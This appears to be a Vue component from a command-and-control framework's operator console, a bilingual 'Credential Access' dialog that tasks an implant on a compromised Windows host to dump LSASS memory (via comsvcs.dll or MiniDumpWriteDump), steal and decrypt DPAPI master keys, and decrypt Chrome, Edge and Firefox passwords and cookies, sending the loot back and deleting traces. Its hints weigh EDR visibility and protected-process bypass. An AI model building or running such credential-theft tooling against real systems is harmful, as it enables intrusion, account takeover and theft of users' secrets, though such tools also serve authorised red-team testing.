<template>
  <el-dialog
    v-model="visible"
    :title="i18nStore.tl('凭据获取', 'Credential Access')"
    width="600px"
    :close-on-click-modal="false"
    append-to-body
    class="cs-dialog"
  >
    <div class="cs-dialog-body cs-font-ui">
      <div class="cs-dialog-desc">
        <span v-if="form.kind === 'lsass'">
          <template v-if="isZh">
            从目标机 <b>lsass.exe</b> 获取内存转储并经加密通道回传。服务端只负责校验与归档，
            <b>不做凭据解析</b>——制品落地后用本地工具解析：
            <code class="cs-font-mono">pypykatz lsa minidump &lt;文件&gt;</code>。
            制品在回传完成后会从目标磁盘删除。
          </template>
          <template v-else>
            Dumps <b>lsass.exe</b> memory on the target and transfers it back over the encrypted channel.
            The server only verifies and stores the artifact — <b>no parsing</b>. Parse locally with
            <code class="cs-font-mono">pypykatz lsa minidump &lt;file&gt;</code>. The dump is deleted from the target after transfer.
          </template>
        </span>
        <span v-else-if="form.kind === 'dpapi'">
          <template v-if="isZh">
            采集当前用户的 <b>DPAPI 主密钥集</b>（<code class="cs-font-mono">%APPDATA%\Microsoft\Protect\&lt;SID&gt;</code>），
            在客户端用用户作用域解密成明文 masterkey 后打包回传。拿到 masterkey 即可离线解开同一用户的
            其他 DPAPI 数据（浏览器主密钥、Credential Manager、Vault、RDP 凭据等）。
            制品（ZIP）在回传完成后会从目标磁盘删除。
          </template>
          <template v-else>
            Collects the current user's <b>DPAPI master keys</b>, decrypts them in-process (user scope)
            and transfers a ZIP back. The master keys unlock other DPAPI-protected data of the same user
            (browser master key, Credential Manager, Vault, saved RDP credentials). Deleted from the target after transfer.
          </template>
        </span>
        <span v-else>
          <template v-if="isZh">
            读取 Chrome/Edge 的 <b>Login Data</b> 与 <b>Cookies</b>，在植入体<b>内存中完成解密</b>
            （DPAPI 主密钥 → AES-GCM），只回传明文 JSON；<b>明文不落盘</b>，临时文件在回传后删除。
            服务端会把口令与 Cookie 自动登记到凭据库（来源标记 <code class="cs-font-mono">browser:*</code> /
            <code class="cs-font-mono">cookie:*</code>），制品本体留档便于复核。
          </template>
          <template v-else>
            Reads Chrome/Edge <b>Login Data</b> and <b>Cookies</b>, decrypts them <b>in implant memory</b>
            (DPAPI key → AES-GCM) and transfers plaintext JSON only. Nothing plaintext touches disk;
            the temp file is deleted after transfer. Credentials and cookies are ingested into the loot DB.
          </template>
        </span>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ i18nStore.tl('目标会话:', 'Session:') }}</label>
        <span class="cs-form-static cs-font-mono">{{ uid ? uid.slice(0, 8) : '-' }}</span>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ i18nStore.tl('凭据类型:', 'Type:') }}</label>
        <el-select v-model="form.kind" size="small" class="cs-form-input" @change="onKindChange">
          <el-option :label="i18nStore.tl('LSASS 内存转储', 'LSASS memory dump')" value="lsass" />
          <el-option :label="i18nStore.tl('DPAPI 主密钥集', 'DPAPI master keys')" value="dpapi" />
          <el-option :label="i18nStore.tl('浏览器凭据与 Cookie', 'Browser credentials & cookies')" value="browser" />
        </el-select>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ i18nStore.tl('获取技术:', 'Technique:') }}</label>
        <el-select v-model="form.tech" size="small" class="cs-form-input">
          <el-option
            v-for="tech in techOptions"
            :key="tech.value"
            :label="i18nStore.tl(tech.zh, tech.en)"
            :value="tech.value"
          />
        </el-select>
      </div>

      <div class="cd-tech-hint">{{ techHint }}</div>

      <!-- 等待回传 / 已落地制品：让操作员看到"还差什么、已经拿到了什么" -->
      <div class="cd-section-title">{{ i18nStore.tl('等待回传', 'Awaiting transfer') }}</div>
      <div v-if="!pending.length" class="cd-empty">{{ i18nStore.tl('无', 'None') }}</div>
      <div v-for="p in pending" :key="p.file_name" class="cd-row">
        <span class="cd-badge cd-badge-wait">{{ i18nStore.tl('等待中', 'Pending') }}</span>
        <span class="cs-font-mono cd-name">{{ p.file_name }}</span>
        <span class="cd-meta">{{ p.operator }} · #{{ p.task_id }}</span>
      </div>

      <div class="cd-section-title">{{ i18nStore.tl('已获取制品', 'Artifacts') }}</div>
      <div v-if="!artifacts.length" class="cd-empty">{{ i18nStore.tl('无', 'None') }}</div>
      <div v-for="a in artifacts" :key="a.id" class="cd-row">
        <span class="cd-badge cd-badge-ok">{{ sourceLabel(a.source, isZh) }}</span>
        <span class="cd-name cd-note" :title="a.note">{{ a.note || a.secret }}</span>
        <a class="row-link" @click="download(a)">{{ i18nStore.tl('取回', 'Fetch') }}</a>
      </div>
    </div>

    <template #footer>
      <div class="cs-dialog-footer-center">
        <button class="cs-btn cs-btn-primary" :disabled="busy || !uid" @click="handleDump">
          {{ busy ? (i18nStore.tl('下发中...', 'Dispatching...')) : (i18nStore.tl('开始获取', 'Start')) }}
        </button>
        <button class="cs-btn" @click="visible = false">{{ i18nStore.tl('关闭', 'Close') }}</button>
      </div>
    </template>
  </el-dialog>
</template>

<script setup lang="ts">
import { computed, reactive, ref, watch } from 'vue'
import { ElMessage } from 'element-plus'
import CredAPI, {
  defaultTech,
  artifactExt,
  sourceLabel,
  type CredArtifact,
  type CredArtifactRequest,
  type CredKind,
} from '@/api/cred'
import ClientAPI from '@/api/clients'
import { useI18nStore } from '@/stores/i18n'
import { downloadBlob } from '@/layout/Dialogs/Payloads/payloadUtil'

const props = withDefaults(defineProps<{ modelValue: boolean; uid?: string }>(), { uid: '' })
const emit = defineEmits<{ (e: 'update:modelValue', value: boolean): void }>()
const visible = computed({
  get: () => props.modelValue,
  set: (value) => emit('update:modelValue', value),
})

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const form = reactive({ kind: 'lsass' as CredKind, tech: 'auto' })
const pending = ref<CredArtifactRequest[]>([])
const artifacts = ref<CredArtifact[]>([])
const busy = ref(false)
let pollTimer: number | null = null

// 技术选项按类型联动：与服务端 cred.TechsFor 同一份清单
const techOptions = computed(() => {
  switch (form.kind) {
    case 'dpapi':
      return [{ value: 'keys', zh: 'keys（用户主密钥，已解密）', en: 'keys (user master keys, decrypted)' }]
    case 'browser':
      return [
        { value: 'all', zh: 'all（Chrome + Edge）', en: 'all (Chrome + Edge)' },
        { value: 'chrome', zh: '仅 Chrome', en: 'Chrome only' },
        { value: 'edge', zh: '仅 Edge', en: 'Edge only' },
      ]
    default:
      return [
        { value: 'auto', zh: 'auto（先签名进程路径，失败回退）', en: 'auto (signed-process first, fallback)' },
        { value: 'comsvcs', zh: 'comsvcs.dll (rundll32)', en: 'comsvcs.dll (rundll32)' },
        { value: 'dbgcore', zh: 'dbgcore.dll (MiniDumpWriteDump)', en: 'dbgcore.dll (MiniDumpWriteDump)' },
      ]
  }
})

const techHint = computed(() => {
  if (form.kind === 'dpapi') {
    return isZh.value
      ? '逐个解密 Protect 目录下的主密钥文件（跳过 Preferred 与 BK-* 备份）。解密在主进程内完成，失败的主密钥会在制品的 errors 字段里说明，不会静默丢弃。'
      : 'Decrypts each master key file under Protect (skips Preferred and BK-* backups). Failures are reported in the artifact errors field, never silently dropped.'
  }
  if (form.kind === 'browser') {
    if (form.tech === 'firefox') {
      return isZh.value
        ? 'Firefox 走 NSS：key4.db 解出主密钥后逐条解密 logins.json，不依赖 DPAPI；Cookie 存在 cookies.sqlite 里且是明文。设了主口令（master password）的 profile 解不开，会记进 errors。'
        : 'Firefox uses NSS: the key4.db master key decrypts logins.json entries (no DPAPI involved); cookies are plaintext in cookies.sqlite. Profiles protected by a master password cannot be decrypted and are reported in errors.'
    }
    return isZh.value
      ? 'Chromium 系（Chrome/Edge）：先用 Local State 里的 DPAPI 保护密钥解出主密钥，再读 Login Data / Cookies 并逐条 AES-GCM 解密；Firefox 走 NSS（见选 firefox 时的说明）。库被浏览器独占时会先复制副本再读；解不开的条目会跳过并计入 errors。'
      : 'Chromium (Chrome/Edge): unwraps the master key from Local State via DPAPI, then decrypts Login Data / Cookies with AES-GCM; Firefox uses NSS (see the firefox hint). Locked DBs are copied first; undecryptable entries are skipped and counted in errors.'
  }
  switch (form.tech) {
    case 'comsvcs':
      return isZh.value
        ? '借签名进程 rundll32 调用 comsvcs.dll!MiniDump：对受 PPL 保护的 LSASS 同样有效，但会拉起子进程并落盘，行为链较长、EDR 覆盖好。'
        : 'Signed process (rundll32) calls comsvcs.dll!MiniDump: works against PPL-protected LSASS, but spawns a child process and writes to disk — a long behavior chain.'
    case 'dbgcore':
      return isZh.value
        ? '在植入体进程内调用签名库 dbgcore.dll!MiniDumpWriteDump：不留子进程、行为链短；但 PPL 开启时会因调用方未签名被拒（返回 ACCESS_DENIED）。'
        : 'In-process call to the signed dbgcore.dll!MiniDumpWriteDump: no child process, short chain; rejected when PPL is on (ACCESS_DENIED).'
    default:
      return isZh.value
        ? '先走 comsvcs（成功率高），失败后自动回退 dbgcore（痕迹更小）。'
        : 'Tries comsvcs first (higher success rate), falls back to dbgcore (smaller footprint).'
  }
})

// 切换类型时把技术重置为该类型的默认值，避免留下"类型 A 的技术配到类型 B"的组合
function onKindChange(kind: CredKind) {
  form.tech = defaultTech(kind)
}

async function refresh() {
  if (!props.uid) return
  try {
    const res = await CredAPI.listArtifacts(props.uid)
    const data = res.data?.data
    pending.value = Array.isArray(data?.pending) ? data.pending : []
    artifacts.value = Array.isArray(data?.artifacts) ? data.artifacts : []
  } catch {
    // 拉取失败保留上一次状态
  }
}

function startPolling() {
  stopPolling()
  // 制品要等客户端下次回连才回传（轮询型传输可能数分钟），5s 刷新一次即可
  pollTimer = window.setInterval(() => {
    if (document.visibilityState === 'hidden') return
    refresh()
  }, 5000)
}

function stopPolling() {
  if (pollTimer !== null) {
    window.clearInterval(pollTimer)
    pollTimer = null
  }
}

// immediate：宿主若在挂载时就已经打开（visible 初值为 true），也要立刻拉一次状态
watch(visible, (val) => {
  if (val) {
    refresh()
    startPolling()
  } else {
    stopPolling()
  }
}, { immediate: true })

async function handleDump() {
  if (!props.uid) return
  busy.value = true
  try {
    const res = await CredAPI.dump({ uid: props.uid, kind: form.kind, tech: form.tech })
    const data = res.data?.data
    ElMessage.success(
      isZh.value
        ? `已下发（任务 #${res.data?.task_id}），等待制品回传：${data?.file_name || ''}`
        : `Dispatched (task #${res.data?.task_id}), awaiting artifact: ${data?.file_name || ''}`,
    )
    await refresh()
  } catch (e: any) {
    ElMessage.error(e?.response?.data?.error || (isZh.value ? '下发失败' : 'Dispatch failed'))
  } finally {
    busy.value = false
  }
}

// 取回制品：制品落在服务端 Downloads 目录，走文件下载接口取到本地
async function download(a: CredArtifact) {
  try {
    const res = await ClientAPI.download_downloaded_file({ uid: a.uid, filePath: a.secret })
    const name = a.secret.split(/[\\/]/).pop() || ('artifact' + artifactExt(a.source))
    downloadBlob(res.data, name)
    ElMessage.success(
      isZh.value
        ? (a.source === 'lsass'
          ? '制品已取回，请用本地工具解析'
          : '制品已取回')
        : 'Artifact fetched',
    )
  } catch {
    ElMessage.error(isZh.value ? '取回失败（制品可能已被清理）' : 'Fetch failed (artifact may be gone)')
  }
}
</script>

<style scoped>
.cs-form-static {
  flex: 1;
  font-size: 13px;
  color: var(--cs-text);
}

.cd-tech-hint {
  margin: 2px 0 10px;
  padding: 6px 10px;
  font-size: 12px;
  line-height: 1.6;
  color: var(--cs-text-dim);
  background: var(--cs-bg);
  border-left: 2px solid var(--cs-active);
  border-radius: 4px;
}

.cd-section-title {
  margin: 10px 0 4px;
  font-size: 12px;
  font-weight: 600;
  color: var(--cs-text-bright);
}

.cd-empty {
  font-size: 12px;
  color: var(--cs-text-dim);
  padding: 2px 0;
}

.cd-row {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 3px 0;
  font-size: 12px;
}

.cd-badge {
  flex-shrink: 0;
  padding: 1px 6px;
  border-radius: 3px;
  font-size: 11px;
  color: #fff;
}

.cd-badge-wait { background: var(--cs-warning); }
.cd-badge-ok { background: var(--cs-online); }

.cd-name {
  flex: 1;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.cd-note { color: var(--cs-text); }

.cd-meta { color: var(--cs-text-dim); font-size: 11px; }

.row-link {
  color: var(--cs-active);
  font-size: 12px;
  cursor: pointer;
}

.row-link:hover { text-decoration: underline; }
</style>
